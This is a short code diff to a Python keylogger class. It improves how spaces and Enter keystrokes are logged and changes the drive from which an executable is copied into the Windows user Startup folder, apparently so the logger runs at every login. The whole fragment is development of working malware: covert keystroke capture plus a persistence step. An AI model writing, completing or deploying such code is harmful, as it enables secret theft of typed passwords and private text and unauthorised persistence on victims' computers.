@@ -24,7 +24,10 @@ class Keylogger:
         except AttributeError:
             
             if key == key.space:
-                hit_key = ""
+                hit_key = " "
+
+            elif key == key.enter:
+                hit_key = "\n"
 
             else:
                 hit_key = "" + str(key) + ""
@@ -34,7 +37,7 @@ class Keylogger:
     def change_dir(self):
         try:
             username = getpass.getuser()
-            shutil.move(r"E:\start.exe", fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.exe")
+            shutil.move(r"F:\start.exe", fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.exe")
             
         except Exception as e:
             pass
